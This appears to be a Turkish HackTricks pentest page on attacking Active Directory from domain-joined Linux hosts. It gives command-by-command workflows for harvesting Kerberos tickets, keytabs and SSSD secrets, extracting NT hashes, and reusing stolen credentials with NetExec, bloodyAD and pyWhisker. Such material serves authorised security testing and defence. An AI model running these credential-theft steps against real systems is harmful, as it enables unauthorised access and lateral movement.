# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Bir Linux makinesi Active Directory ortamının içinde de bulunabilir.

AD içindeki bir Linux makinesi **Kerberos materyallerini yerel olarak depolayabilir**: kullanıcı ccache'leri, makine/servis keytab'leri ve SSSD tarafından yönetilen secret'lar. Bu artefact'lar genellikle diğer Kerberos credential'ları gibi yeniden kullanılabilir. Bunların çoğunu okuyabilmek için ticket'ın sahibi olan kullanıcı veya makinede **root** olmanız gerekir.

## Enumeration

### Linux'tan AD enumeration

Linux üzerinde (veya Windows'ta bash üzerinden) bir AD'ye erişiminiz varsa AD'yi enumerate etmek için [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) aracını deneyebilirsiniz.

Ayrıca **Linux'tan AD'yi enumerate etmenin diğer yollarını** öğrenmek için aşağıdaki sayfaya bakabilirsiniz:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA, temel olarak **Unix** ortamları için Microsoft Windows **Active Directory**'ye yönelik açık kaynaklı bir **alternatif**tir. Active Directory'ye benzer yönetim için eksiksiz bir **LDAP directory**'yi MIT **Kerberos** Key Distribution Center ile birleştirir. CA ve RA certificate yönetimi için Dogtag **Certificate System** kullanan FreeIPA, smartcard'lar dahil **multi-factor** authentication'ı destekler. SSSD, Unix authentication süreçleri için entegre edilmiştir. Bu konu hakkında daha fazla bilgi için:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefact'ları

Ticket'lara dokunmadan önce **host'un AD'ye nasıl join edildiğini** ve **Kerberos materyalinin gerçekte nerede depolandığını** belirleyin. Modern Linux host'larında bu işlem genellikle `/tmp` içindeki düz dosyalarla değil, `realmd` + `adcli` + `sssd` ile gerçekleştirilir:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Bu, host'un AD'ye güvenip güvenmediğini, SSSD'nin identity veya ticket'ları cache'leyip cache'lemediğini ve **machine/service keytab** veya **KCM secrets**'ın abuse için kullanılabilir olup olmadığını hızlıca gösterir.

## Ticket'larla Oynama

### Pass The Ticket

Bu sayfada bir **Linux host içindeki Kerberos ticket'larını bulabileceğiniz** farklı konumları bulacaksınız. Aşağıdaki sayfada bu CCache ticket formatlarını Kirbi'ye (Windows'ta kullanmanız gereken format) nasıl dönüştüreceğinizi ve PTT attack gerçekleştirmeyi öğrenebilirsiniz:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

**Linux'a özgü ticket harvesting workflow'larını** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, vb.) öğrenmek istiyorsanız ilgili sayfaya bakın:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### `/tmp`'den CCACHE ticket yeniden kullanımı

CCACHE dosyaları, **Kerberos kimlik bilgilerini depolamak** için kullanılan binary formatlardır. `FILE:/tmp/krb5cc_%{uid}` hâlâ yaygındır, ancak modern Linux dağıtımlarında `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` veya `KCM:%{uid}` de kullanılır. Ticket'ların `/tmp` içinde bulunduğunu varsaymadan önce **`KRB5CCNAME`** environment variable'ını ve `default_ccache_name` ayarını kontrol edin.<sup>[[1]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Keyring'den CCACHE ticket reuse

**Bir process'in memory'sinde depolanan Kerberos ticket'ları extract edilebilir**; özellikle makinenin ptrace protection'ı devre dışı bırakılmışsa (`/proc/sys/kernel/yama/ptrace_scope`). Bu amaçla kullanılabilecek faydalı bir tool [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) adresinde bulunur. Bu tool, session'lara inject ederek ve ticket'ları `/tmp` dizinine dump ederek extraction işlemini kolaylaştırır.

Bu tool'u configure etmek ve kullanmak için aşağıdaki adımlar izlenir:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Bu prosedür çeşitli session'lara inject etmeyi deneyecek ve başarıyı, çıkarılan ticket'ları `/tmp` altında `__krb_UID.ccache` adlandırma kuralıyla kaydederek gösterecektir.<sup>[[1]](#references)</sup>

### SSSD KCM'den CCACHE ticket yeniden kullanımı

SSSD, veritabanının bir kopyasını `/var/lib/sss/secrets/secrets.ldb` path'inde tutar. İlgili key, `/var/lib/sss/secrets/.secrets.mkey` path'inde hidden file olarak saklanır. Varsayılan olarak key yalnızca **root** permissions'ına sahipseniz okunabilir.

**`SSSDKCMExtractor`** aracını --database ve --key parametreleriyle çalıştırmak, veritabanını parse eder ve **secrets'ı decrypt eder**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**credential cache Kerberos blob**, Mimikatz/Rubeus'a aktarılabilecek kullanılabilir bir **Kerberos CCache** dosyasına dönüştürülebilir.

### Hızlı keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### /etc/krb5.keytab dosyasından hesapları çıkarma

Root yetkileriyle çalışan servisler için gerekli olan servis hesabı anahtarları, güvenli bir şekilde **`/etc/krb5.keytab`** dosyalarında saklanır. Servisler için parolalara benzeyen bu anahtarların gizliliği kesinlikle korunmalıdır.

Keytab dosyasının içeriğini incelemek için **`klist`** kullanılabilir. Linux'ta `klist -k -K -e`, principal'ları, anahtar sürüm numaralarını, şifreleme türlerini ve ham anahtar materyalini yazdırır. Anahtar türü **23 / RC4-HMAC** ise anahtar değeri aynı zamanda ilgili principal'ın **NT hash** değeridir.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Linux kullanıcıları için **`KeyTabExtract`**, NTLM hash reuse için kullanılabilecek RC4 HMAC hash'ini çıkarmaya olanak tanır. Bunun yalnızca keytab hâlâ **etype 23 / RC4-HMAC** materyali içeriyorsa yardımcı olduğunu unutmayın. **AES-only** ortamlarda yeniden kullanılabilir bir NT hash elde edemeyebilirsiniz; ancak Kerberos aracılığıyla keytab'ı kullanarak doğrudan kimlik doğrulaması yapabilirsiniz.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOS'ta **`bifrost`**, keytab dosyası analizi için bir araç görevi görür.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Çıkarılan hesap ve hash bilgileri kullanılarak, **`NetExec`** gibi araçlarla sunuculara bağlantılar kurulabilir.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### `/etc/krb5.keytab` içindeki machine account'u yeniden kullanma

`realmd`/`adcli`/`sssd` ile join edilmiş sistemlerde `/etc/krb5.keytab` genellikle **computer account** ve bir veya daha fazla **host/service principal** içerir. **root** erişiminiz varsa dosyayı doğrudan dump etmeyin: `klist -k` tarafından listelenen principal'lardan birini kullanarak TGT isteyin ve Linux host'un kendisi olarak işlem yapın.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Bu, özellikle **computer object**'in kendisine AD'de delegated rights verildiğinde veya host'un **gMSA** gibi diğer secret'ları retrieve etmesine izin verildiğinde kullanışlıdır.

### Çalınmış Kerberos materyalini Linux-first AD tooling ile yeniden kullanma

Geçerli bir `ccache` veya kullanılabilir bir keytab elde ettiğinizde, her şeyi önce Windows formatlarına dönüştürmeden **doğrudan Linux'tan** AD üzerinde işlem yapabilirsiniz. Birçok modern tool, `KRB5CCNAME` / Kerberos authentication'ı native olarak destekler:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Bu, **Linux post-exploitation** ile **AD object abuse** arasında iyi bir köprüdür. Object-level abuse yollarının kendisi için şunlara bakın:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefaktları

Güncel Linux deployment'ları **Managed Service Account** hesaplarını doğrudan AD'den kullanabilir. Pratikte bu, bir Linux sunucusunu compromise ettikten sonra yalnızca host keytab'ini değil, aynı zamanda bir gMSA'dan oluşturulan **service-specific keytab** dosyalarını da bulabileceğiniz anlamına gelir. İncelenecek yaygın konumlar arasında `/etc/gmsad.conf`, deployment'a özgü config dosyaları ve `/etc` altındaki ek `*.keytab` dosyaları bulunur.<sup>[[2]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Bu, **herhangi bir Windows endpoint'e dokunmadan**, gMSA'ya bağlı SPN'ler için yeniden kullanılabilir bir Kerberos kimliği sağlar. AD'de daha yüksek ayrıcalıklar elde ettikten sonra **domain-side** gMSA/dMSA abuse için şuraya bakın:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## Referanslar

- [1] [Kerberos (II): Kerberos'a nasıl saldırılır?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Managed service account ile AD'ye erişim – RHEL sistemlerini doğrudan Active Directory ile entegre etme](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
